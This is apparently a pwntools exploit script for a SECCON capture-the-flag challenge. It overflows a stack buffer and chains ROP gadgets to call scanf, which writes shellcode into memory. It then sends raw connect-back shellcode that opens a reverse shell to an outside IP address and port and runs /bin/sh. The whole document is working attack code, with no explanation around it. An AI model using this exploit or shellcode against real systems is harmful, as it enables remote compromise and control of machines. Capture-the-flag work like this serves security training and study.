from pwn import *
context.arch='amd64'

# r = process("./chall")
# r = remote("0.0.0.0", 9998)
r = remote("pwn-neko.chal.seccon.jp", 9001)

PADDING = 40
SCANF_ADDR = 0x4005c0
POP_RSI = 0x4007e1
POP_RDI = 0x4007e3
SCANF_ARG1 = 0x40081b
SCANF_ARG2 = 0x600000

payload = b"A"*PADDING
payload += p64(POP_RDI)
payload += p64(SCANF_ARG1)
payload += p64(POP_RSI)
payload += p64(SCANF_ARG2)
payload += b"lolololo"
payload += p64(SCANF_ADDR)
payload += p64(SCANF_ARG2) # return to shellcode

r.sendline(payload)

# send shellcode
host = "107.191.40.238"
port = 1911
network = 'ipv4'
# shellcode = asm(shellcraft.amd64.linux.connect(host, port, network))
# shellcode = b'j)Xj\x02_j\x01^\x99\x0f\x05H\x89\xc5H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8\x03\x01\x06vj\xbe)\xefH1\x04$j*XH\x89\xefj\x10ZH\x89\xe6\x0f\x05'
# shellcode += asm(shellcraft.amd64.linux.findpeersh(port))
shellcode = b'j)Xj\x02_j\x01^\x99\x0f\x05H\x89\xc5H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8\x03\x01\x06vj\xbe)\xefH1\x04$j*XH\x89\xefj\x10ZH\x89\xe6\x0f\x05H\x89\xef1\xf6j!X\x0f\x051\xffj\x01^j!X\x0f\x05jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'

r.sendline(shellcode)
